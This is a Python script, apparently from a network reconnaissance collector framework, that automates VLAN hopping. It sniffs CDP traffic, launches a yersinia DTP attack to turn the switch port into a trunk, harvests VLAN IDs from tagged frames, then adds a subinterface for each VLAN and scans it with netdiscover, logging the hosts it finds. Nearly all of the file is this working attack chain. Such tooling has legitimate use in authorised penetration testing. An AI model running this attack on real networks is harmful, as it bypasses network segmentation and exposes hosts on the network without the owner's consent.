#!/usr/bin/env python3

# vlan collector utility, find vlans and perform an arp scan
# script will run through once, and store gathered data in the database
# command utility to scrape: tshark yersinia arp-scan
# gather information: vlan, host

# Python interpretation of the "vlan-hopper" project
# git clone https://github.com/nccgroup/vlan-hopping.git
# kennedyengineering 2020

# import collector module from parent directory
import os, sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from collector import Collector
import netifaces
import subprocess
import time
import ipaddress

# create collector
collector_name = "vlan"
collector = Collector(collector_name)

TAGSEC = 90
CDPSEC = 90
DTPWAIT = 20

# verify that the user supplied interface is available
ifaces = netifaces.interfaces()
iface = collector.misc_config["interface"]
if iface not in ifaces:
    collector.logger.error("Interface {} not available, exiting...".format(iface))
    collector.close()
    exit()
else:
    collector.logger.debug("Interface {} found".format(iface))

# verify that CDP is enabled
collector.logger.debug("Sniffing CDP Packets on interface {}".format(iface))
command = '''sudo tshark -a duration:{} -i {} -Y "cdp" -V 2>&1 | sort --unique'''.format(CDPSEC, iface)
output = collector.execute(command)
output = output.split("\n")
for line in output:
    if "0 packets captured" in line:
        # exit if CDP was not found
        collector.logger.error("CDP is not enabled on the switch, exiting...")
        collector.close()
        exit()
collector.logger.debug("CDP is enabled on the switch")

# start yersinia exploit
collector.logger.debug("Starting attack on interface {}, waiting {} seconds".format(iface, DTPWAIT))
command = "sudo yersinia dtp -attack 1 -interface {}".format(iface)
collector.logger.debug("Executing {}".format(command))
yersinia = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
time.sleep(DTPWAIT)

# discover vlans
collector.logger.debug("Extracting VLAN IDs on interface {}, sniffing 802.1Q tagged packets for {} seconds".format(iface, TAGSEC))
command = '''sudo tshark -a duration:$TAGSEC -i $INT -Y "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique'''
command = command.replace("$TAGSEC", str(TAGSEC))
command = command.replace("$INT", iface)
vlan_ids = collector.execute(command)
if not vlan_ids:
    collector.logger.error("No vlan found, exiting...")
    collector.close()
    yersinia.kill()
    exit()
vlan_ids = vlan_ids.split("\n")
vlan_ids = [string for string in vlan_ids if string != ""]

# arp scan vlans for hosts
#IP_ADDRESS = "10.10.1.0/24"
#addrs = netifaces.ifaddresses(iface)[netifaces.AF_INET]
#addr = addrs[0]
#ip_addr = addr['addr']
#subnet = addr['netmask']
#net = str(ipaddress.ip_network('{}/{}'.format(ip_addr, subnet), strict=False))

for vlan in vlan_ids:

    collector.logger.debug("Adding vlan {} to interface {}".format(vlan, iface))
    command = "sudo vconfig add {} {} 2>&1".format(iface, vlan)
    null = collector.execute(command)

    net = None
    timer = 0
    time_limit = 20
    while timer < time_limit:
        try:
            addrs = netifaces.ifaddresses(iface+"."+vlan)[netifaces.AF_INET]
            addr = addrs[0]
            ip_addr = addr['addr']
            subnet = addr['netmask']
            net = str(ipaddress.ip_network('{}/{}'.format(ip_addr, subnet), strict=False))
            break
        except KeyError:
            time.sleep(1)
            timer += 1
    if net == None:
        continue

    collector.logger.debug("Scanning for hosts on vlan {}, with IP {}".format(vlan, net))
    #command = '''sudo arp-scan -Q {} -I {} {} -t 500 2>&1 |grep "802.1Q VLAN="'''.format(vlan, iface+"."+vlan, net)
    collector.logger.debug("Broadcasting to 255.255.255.255 network")
    broadcast_proc = subprocess.Popen("ping -I {}.{} -b 255.255.255.255 2>&1".format(iface, vlan), shell=True, stdout=subprocess.PIPE)
    command = "sudo netdiscover -N -P -i {}.{}".format(iface, vlan)
    scan_results = collector.execute(command, timeout = 60)
    collector.logger.error(scan_results)
    broadcast_proc.kill()

    output = scan_results.split("\n")
    
    simplified_output = []
    for i in output:
        temp_arr = []
        i = i.split(" ")
        for ii in i:
            if ii != '':
                temp_arr.append(ii)
        simplified_output.append(temp_arr)
    simplified_output.remove([])

    for i in simplified_output:
        parsed_output = {}

        # IP Adress
        ip = i[0]
        parsed_output["IP"] = ip

        # MAC Address
        mac_address = i[1]
        parsed_output["MAC"] = mac_address

        parsed_output["VLAN"] = vlan

        # Hostname
        name = ""
        max_index = len(i)
        for ii in range(4, max_index):
            name += i[ii] + " "
        if name != "":
            name = name[:-1]
        parsed_output["HOST_INFORMATION"] = name

        collector.publish(parsed_output)

    '''
    scan_results = scan_results.split("\n")
    scan_results = [string for string in scan_results if string != ""]
    for result in scan_results:
        parsed_output = {}
        result = result.split("\t")
        parsed_output["IP"] = result[0]
        parsed_output["MAC"] = result[1]
        parsed_output["VLAN"] = vlan
        parsed_output["HOST_INFORMATION"] = result[2]
        collector.publish(parsed_output)
    '''
    collector.logger.debug("Removing vlan {} from interface {}".format(vlan, iface))
    command = "sudo vconfig rem {} 2>&1".format(iface+"."+vlan)
    null = collector.execute(command)
    
    
# bring down yersinia process
yersinia.kill()

collector.close()
